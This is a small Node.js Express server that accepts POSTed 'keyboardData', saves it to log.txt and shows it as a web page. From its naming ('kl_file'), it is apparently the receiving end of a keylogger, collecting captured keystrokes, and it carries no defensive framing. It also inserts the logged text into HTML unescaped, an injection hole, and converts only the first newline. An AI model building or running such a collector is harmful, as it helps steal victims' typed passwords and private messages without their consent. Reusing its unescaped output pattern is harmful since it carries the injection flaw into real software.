const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json({extended: true}));

const port = 8080;

app.get("/", (req, res) => {
    try {
        const kl_file = fs.readFileSync(`./log.txt`, {encoding:'utf8', flag:'r'});    
        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
    } catch {
        res.send("<h1>Nothing logged yet.</h1>");
    }  
});

app.post("/", (req, res) => {
    console.log("Request received!");
    fs.writeFileSync(`log.txt`, req.body.keyboardData);
    res.send("Successfully set the data");
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});